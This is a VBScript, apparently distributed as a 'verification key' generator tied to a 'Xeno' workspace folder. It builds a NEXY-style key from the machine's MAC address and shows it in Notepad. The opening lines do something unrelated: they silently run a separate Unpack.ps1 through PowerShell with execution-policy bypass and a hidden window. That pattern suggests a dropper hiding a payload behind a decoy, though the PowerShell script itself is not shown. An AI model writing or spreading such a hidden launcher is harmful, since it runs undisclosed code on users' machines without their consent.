Set shell = CreateObject("WScript.Shell")
shell.Run "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & Replace(WScript.ScriptFullName, "RunUnpackHidden.vbs", "Unpack.ps1") & """", 0, False


' ===== Создаём объекты =====
Set fso = CreateObject("Scripting.FileSystemObject")
Set WshShell = CreateObject("WScript.Shell")

' Путь к файлу в LOCALAPPDATA
tempPath = WshShell.ExpandEnvironmentStrings("%LOCALAPPDATA%\Xeno\workspace\verification_key.txt")

' ===== Проверка: если файл уже существует — выходим =====
If fso.FileExists(tempPath) Then
    shell.Run "notepad.exe """ & tempPath & """", 1, False
    WScript.Quit
End If

' ===== Получаем MAC адрес =====
Set objWMI = GetObject("winmgmts:\\.\root\cimv2")
Set adapters = objWMI.ExecQuery("SELECT MACAddress FROM Win32_NetworkAdapter WHERE MACAddress IS NOT NULL")

mac = ""
For Each adapter In adapters
    mac = adapter.MACAddress
    Exit For
Next

If mac = "" Then mac = "00:00:00:00:00:00"

' ===== Генерация ключа формата NEXY-XXXX-XXXX-XXXX-RAND =====
cleanMac = Replace(mac, ":", "")
cleanMac = UCase(cleanMac)

' Набираем 12 символов
cleanMac = Left(cleanMac & "000000000000", 12)

part1 = Mid(cleanMac, 1, 4)
part2 = Mid(cleanMac, 5, 4)
part3 = Mid(cleanMac, 9, 4)

' ===== Генерируем случайные 4 цифры =====
Randomize
rand4 = Right("0000" & Int((9999 - 1000 + 1) * Rnd + 1000), 4)

' Итоговый ключ
key = "NEXY-" & part1 & "-" & part2 & "-" & part3 & "-" & rand4

' ===== Записываем ключ =====
Set file = fso.CreateTextFile(tempPath, True)
file.Write key
file.Close


' Открываем TXT
shell.Run "notepad.exe """ & tempPath & """", 1, False
